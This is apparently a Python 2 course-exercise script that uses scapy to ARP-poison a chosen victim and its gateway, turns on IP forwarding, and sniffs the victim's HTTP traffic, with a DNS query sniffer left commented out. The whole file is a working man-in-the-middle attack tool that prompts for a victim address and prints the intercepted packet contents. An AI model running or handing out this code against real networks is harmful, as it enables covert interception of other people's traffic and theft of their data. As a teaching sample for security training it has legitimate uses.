#!/usr/bin/python

from scapy.all import *
from scapy.error import Scapy_Exception
import httplib
import threading, os, sys
##ARP poison, DNS mitm #spse course##

print 'Make sure you are running as root!\n'

VIP = raw_input('Please enter the IP address of the victim computer: ')
GW = raw_input('Please enter the IP address of the gateway: ')
IFACE = raw_input('Please enter the name of your interface e.g. eth0: ')

print '\t\t\nPoisoning Victim & Gateway!..'
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward') #Ensure the victim recieves packets by forwarding them
#os.system('service whoopsie stop') ##daisy.ubuntu.com

def dnshandle(pkt):
	if pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0:
		print 'Victim ' + VIP + ' has searched for: ' + pkt.getlayer(DNS).qd.qname

def tcphandle(pkt):
	if pkt.haslayer(TCP) and pkt.getlayer(TCP).haslayer(Raw) == 1 and pkt.getlayer(IP).src == VIP:
		print 'Victim ' + VIP + ' : ', pkt.getlayer(TCP).load[:25]

def v_poison():
	v = ARP(pdst=VIP, psrc=GW)
	while True:
		try:
			send(v, verbose=0, inter=2, loop=1)
		except KeyboardInterupt:
			sys.exit(1)

def gw_poison():
	gw = ARP(pdst=GW, psrc=VIP)
	while True:
		try:
			send(gw, verbose=0, inter=2, loop=1)
		except KeyboardInterupt:
			sys.exit(1)


vthread=[]
gwthread=[]

while True:
	vpoison = threading.Thread(target=v_poison)
	vpoison.setDaemon(True)
	vthread.append(vpoison)
	vpoison.start()

	gwpoison = threading.Thread(target=gw_poison)
	gwpoison.setDaemon(True)
	gwthread.append(gwpoison)
	gwpoison.start()

	pkt = sniff(iface=IFACE, filter='tcp port 80', prn=tcphandle)
	#pkt = sniff(iface=IFACE, filter='udp port 53', prn=dnshandle)
